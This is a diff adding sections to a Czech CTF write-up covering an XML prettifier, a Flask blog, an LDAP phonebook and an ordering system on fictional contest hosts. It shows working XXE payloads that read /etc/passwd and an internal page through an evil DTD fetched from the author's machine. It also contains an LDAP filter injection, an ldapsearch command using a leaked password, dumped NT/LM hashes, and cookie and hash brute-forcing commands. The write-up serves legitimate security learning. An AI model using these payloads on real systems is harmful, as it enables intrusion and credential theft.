@@ -878,18 +878,277 @@ Na poslední zmíněné stránce najdeme vlajku `FLAG{hvIM-3aty-R39h-dOZ4}`.
 
 ---
 
-## XML Prettifier (nedokončeno, 4 body)
+## XML Prettifier (dokončeno po soutěži, 4 body)
 
-TODO
+> Hi, packet inspector,
+>
+> some former employe of Mysterious Delivery Ltd. has created prettifier for XML
+> code. It is polite to provide information to the AI in nicely formatted XML,
+> isn't it? Rumors say that the employee also left some crucial information
+> somewhere on the web.
+>
+> Find the crucial information on webpage
+> <http://prettifier.mysterious-delivery.tcc:50000>.
+>
+> May the Packet be with you!
+
+*Disclaimer: Tuto úlohu jsem bohužel dokončil až po konci soutěže během
+sepisování tohoto writeupu, kdy jsem našel své chyby :(.*
+
+Na odkazované stránce si všimneme odkazu na
+[/notes](http://prettifier.mysterious-delivery.tcc:50000/notes), který bohužel
+vrací "Forbidden, IP filter is active, content is accessible only from
+localhost.". Vypadá to, že se budeme muset dostat k této stránce.
+
+Pak si všimneme odkazu na stránku, kam lze zadat XML a udělat ho hezkým. XML je
+docela komplikovaný formát, takže k tomu udělat ho pěkným ho pravděpodobně bude
+třeba na backendu naparsovat a pak opět dumpnout do stringu.
+
+XML dokument většinou vypadá tak, že začíná `<!DOCTYPE ...>` definující
+strukturu XML a poté pokračuje samotným tělem XMLka. Třeba takto v případě
+externího odkazu na definici:
+
+```xml
+<!DOCTYPE root SYSTEM "definice.dtd">
+<root>
+...
+</root>
+```
+
+V `DOCTYPE` lze ale specifikovat mnohem více věcí a špatně nastavený XML parser
+je náchylný na XXE útok (XML External Entity). Například takhle si lze vypsat
+obsah souboru `/etc/passwd`, definujeme si entitu `xxe` a tu pak v těle necháme
+vypsat:
+
+```xml
+<!DOCTYPE foo [
+  <!ELEMENT foo ANY >
+  <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
+<foo>&xxe;</foo>
+```
+
+Toto skutečně zafunguje a vypíše nám na webu obsah `/etc/passwd`. Bohužel když
+zkusíme vypsat obsah `/notes` získaný přes localhost:
+
+```xml
+<!DOCTYPE foo [
+  <!ELEMENT foo ANY >
+  <!ENTITY xxe SYSTEM "http://localhost:50000/notes" >]>
+<foo>&xxe;</foo>
+```
+
+Bohužel v tu chvíli nám web zahlásí, že při parsování XML získaného z této adresy
+nastala chyba:
+
+```text
+http://localhost:50000/notes:3:2:FATAL:PARSER:ERR_NAME_REQUIRED: StartTag: invalid element name
+http://localhost:50000/notes:13:8:FATAL:PARSER:ERR_TAG_NAME_MISMATCH: Opening and ending tag mismatch: link line 12 and head
+http://localhost:50000/notes:45:8:FATAL:PARSER:ERR_TAG_NAME_MISMATCH: Opening and ending tag mismatch: link line 9 and html
+http://localhost:50000/notes:45:8:FATAL:PARSER:ERR_TAG_NOT_FINISHED: Premature end of data in tag meta line 8 <string>:4:11:FATAL:PARSER:ERR_UNDECLARED_ENTITY: Entity 'xxe' failed to parse
+```
+
+Co s tím? HTML kód stránky se spoustou `<` a `>` zkrátka takhle jednoduše do XML
+nenacpeme. Existuje ale element `<![CDATA[ ... ]]>`, do kterého lze nacpat
+cokoliv a nebude to parsováno jakožto XML, to by mohlo být řešení. Bohužel ale
+nejde použít přímo, protože nejde kombinovat externí a vnitřní entity. Pro detaily
+viz specifikace XMLka… nebo si to zkusit, jak jsem zkusil já.
+
+Je potřeba udělat trik s oklikou. Vyrobíme si zlou specifikaci v `.dtd` souboru,
+kde už trik s `CDATA` použít lze, a přinutíme XML parser, aby ho načetl.
+
+Zlé DTD může vypadat třeba takto:
+
+```xml
+<!ENTITY % url SYSTEM "http://localhost:50000/notes">
+<!ENTITY % start "<![CDATA[">
+<!ENTITY % end "]]>">
+<!ENTITY % all "<!ENTITY contents '%start;%url;%end;'>">
+```
+
+*Poznámka: Během soutěže jsem DTD měl bohužel špatně poskládané a nepovedlo se mi
+ho oddebugovat, opravil jsem to až při psaní tohoto writeupu.*
+
+Vystavíme ho třeba na lokálním počítači – když jsem připojení k VPNce, může se
+k nám server s XML parserem taky připojit. Do XML parseru pak vložíme následující
+XML:
+
+```xml
+<!DOCTYPE data [
+  <!ENTITY % dtd SYSTEM
+  "http://10.200.0.7/evil.dtd">
+  %dtd;
+  %all;
+]>
+<data>&contents;</data>
+```
+
+… a parser nám vypíše zdrojáky stránky obsahující mimo jiné i FLAG: `FLAG{GG53-5U3w-VT8F-qB31}`.
 
 ## Blog site (nedokončeno, 4 body)
 
-TODO
+> Hi, packet inspector,
+>
+> a simple blog webpage was created where all employees can write their
+> suggestions for improvements. It is one part of the optimization plan designed
+> by our allmighty AI.
+>
+> Examine the web <http://blog.mysterious-delivery.tcc:20000/> and find any
+> interesting information.
+>
+> May the Packet be with you!
+
+*Disclaimer: Tuto úlohu jsem bohužel nedokončil. Sepisuji zde alespoň svůj
+postup, který ale nemusí vést k řešení.*
+
+Když se podíváme na odkazovaný blog, okamžitě nás zaujme jeho název – Flaskr.
+Vypadá to, že má něco společného s webovým frameworkem Flask pro Python.
+A skutečně, když zkusíme tento název vyhledat, tak dohledáme, že se jedná
+o [ukázkový tutoriál na tvorbu Flask aplikace](https://flask-docs-ja.readthedocs.io/en/latest/tutorial/).
+Dokonce si můžeme stáhnout i zdrojové kódy:
+
+<https://github.com/pallets/flask/tree/main/examples/tutorial>
+
+Máme tedy zdrojové kódy aplikace, tak si ji můžeme prohlédnout. Je to jednoduchá
+aplikace, která používá SQLite3 databázi uživatelů a příspěvků a umožňující
+registraci, přihlášení, napsání a editaci příspěvku.
+
+Aplikace na první pohled neobsahuje žádnou zjevnou díru, tak jsem zkusil cílit
+svůj útok na její nastavení. Přihlášený uživatel je totiž autentifikován
+pomocí podepsané cookie s názvem `session`. Pomocí devtools si ji vytáhneme,
+může vypadat třeba takto:
+
+```text
+eyJ1c2VyX2lkIjoxMDAxfQ.Y2v_5g.ECnkItqMkllygEgnPXPAby6AvjE
+```
+
+Její první část je base64 zakódovaný JSON, v tomto případě `{"user_id":1001}`.
+Druhá část je pak podpis. Podpis vznikl s použitím `SECRET_KEY` z konfigurace.
+Jedna z možností je, že autor aplikace nezměnil defaultní hodnotu `DEV`
+z tutoriálu. Pojďme tedy zkusit nějaké nástroje.
+
+Existuje jednoduchý tool [flask-unsign](https://pypi.org/project/flask-unsign/),
+kterému lze zadat cookie a zkusit, jestli náhodou neuhádneme klíč, se kterým
+byla vytvořena:
+
+```sh
+$ flask-unsign -d --cookie "eyJ1c2VyX2lkIjoxMDAxfQ.Y2v_5g.ECnkItqMkllygEgnPXPAby6AvjE"
+{'user_id': 1001}
+$ flask-unsign -u --cookie "eyJ1c2VyX2lkIjoxMDAxfQ.Y2v_5g.ECnkItqMkllygEgnPXPAby6AvjE"
+[*] Session decodes to: {'user_id': 1001}
+[*] No wordlist selected, falling back to default wordlist..
+[*] Starting brute-forcer with 8 threads..
+[!] Failed to find secret key after 50647 attempts.
+```
+
+`flask-unsign` obsahuje celkem obsáhlý wordlist, ale bohužel nic nenašel,
+vyzkoušení `dev` přímo z tutoriálu boužel také k ničemu nevedlo.
+
+*Toto je místo, kde jsem s řešením skončil a dál jsem se nedostal.*
 
 ## Phonebook (nedokončeno, 5 bodů)
 
-TODO
+> Hi, packet inspector,
+>
+> you should already get access to the phone book – as a new employee – but the
+> AI is too busy right now. This condition can last several ... who knows ...
+> years?
+>
+> Your task is to gain access to the application running on
+> <http://phonebook.mysterious-delivery.tcc:40000>.
+>
+> May the Packet be with you!
+
+*Disclaimer: Tuto úlohu jsem bohužel nedokončil. Sepisuji zde alespoň svůj
+postup, který ale nemusí vést k řešení.*
+
+Ve zdrojovém kódu stránky se ná najít poznámka:
+
+```html
+<!-- New LDAP server host: 10.99.0.121 -->
+<!-- 1/2/2022 Temporary search filter (|(&(memberof=cn=users,ou=groups,dc=local,dc=tcc)(uid=_DATA_))(memberof=cn=nonmigrated,ou=groups,dc=local,dc=tcc)) -->
+<!-- 6/8/2022 Filter after migration  (|(&(memberof=cn=users,ou=groups,dc=local,dc=tcc)(uid=_DATA_}))) -->
+```
+
+Dostáváme tak adresu LDAP serveru i ukázku dotazů, které asi tato webová
+aplikace LDAP serveru pokládá. Zkusíme, jestli je `__DATA__` nahrazované bez
+jakéhokoliv escapování a půjde tak udělat nějaký typ query injection.
+
+V LDAP filterech se AND nebo OR zapisují v prefixové notaci, tedy pokud
+bych chtěl udělat OR tří výrazů, napíšeu ho jako `(|(A)(B)(C))`. To by normálně
+situaci trochu zkomplikovalo (protože nemůže napsat něco jako `)) OR 1`), ale
+tady to vypadá, že na začátku výrazu zůstal zapomenutý OR.
+
+Zkusme tedy poslat dotaz `))(|(uid=*`, tím z výrazu vznikne:
+
+```text
+(| (&(memberof=...)(uid=)) (|(uid=*)) )
+```
+
+Dostaneme [výpis](12_Phonebook/web_query_out.txt), na jehož konci jsou dva zajímavé údaje:
+
+* `admin2` je ve skupině `web_admins` a mohlo by tedy být zajímavé přihlásit se
+  na web jeho jménem
+* `ldap_sync` má poznámku `Don't change password. gasg35faCasgt%AF` – máme heslo :)
+
+Vyzkoušíme se tedy jako `ldap_sync` přihlásit a vylistovat údaje o všech uživatelích:
+
+```sh
+ldapsearch -x -b 'dc=local,dc=tcc' -H 'ldap://10.99.0.121' -D "uid=ldap_sync,ou=people,dc=local,dc=tcc" -w "gasg35faCasgt%AF" "(uid=*)"
+```
+
+Dostáváme celkem [rozsáhlý výstup](12_Phonebook/ldap_out.txt), o našem adminovi
+například toto:
+
+```text
+# admin2, people, local.tcc
+dn: uid=admin2,ou=people,dc=local,dc=tcc
+objectClass: inetOrgPerson
+objectClass: sambaSamAccount
+cn: admin2
+givenName: admin
+sn: admin2
+homePhone: 5452487532
+mail: admin2@local.tcc
+sambaSID: S-1-5-21-1528920847-3529959213-2887712062
+sambaNTPassword: 32644235283BC5561CC7FE4FFFADDAEE
+sambaLMPassword: 48448F207404DB05F3BAC3A9216F6D52
+uid: admin2
+description: Admin account
+```
+
+Nápadné je `sambaNTPassword` a `sambaLMPassword`. Podle
+[dokumentace](http://ubiqx.org/cifs/SMB.html#SMB.8) by LM hash by měl DES()
+z uppercase hesla a NT hash by mělo být MD4() hesla.
+
+Zkusil jsem NT i LM heslo rasknout pomocí John-the-Ripper, ale bohužel bez úspěchu:
+
+```sh
+# Vestavěný wordlist:
+john-the-ripper --fork=8 --format=NT 12_Phonebook/hashNT.dat
+john-the-ripper --fork=8 --format=LM 12_Phonebook/hashLM.dat
+
+# RockYou wordlist:
+john-the-ripper --fork=8 --format=NT --rules -w=~/rockyou.txt 12_Phonebook/hashNT.dat
+john-the-ripper --fork=8 --format=LM --rules -w=~/rockyou.txt 12_Phonebook/hashLM.dat
+```
+
+*Toto je místo, kde jsem s řešením skončil a dál jsem se nedostal.*
 
 ## Orderly IS (nedokončeno, 5 bodů)
 
-TODO
+> Hi, packet inspector,
+>
+> do you want to order something? Use our Orderly information system, it is
+> intuitive, fast, reliable and secure! At least that's what we claim in the TV
+> ad. In last few hours it began to act weirdly, but its administrator is on
+> vacation away from civilization (and connectivity).
+>
+> You will have to break into the
+> [Orderly information system](http://orderly.mysterious-delivery.tcc:23000/)
+> and check its configuration.
+>
+> May the Packet be with you!
+
+*Disclaimer: Tuto úlohu jsem bohužel nedokončil. Dokone jsem zde nepřišel ani na
+nic zajímavého hodného sepsání. Doporučuji podívat se na writeup někoho
+úspěšnějšího.*
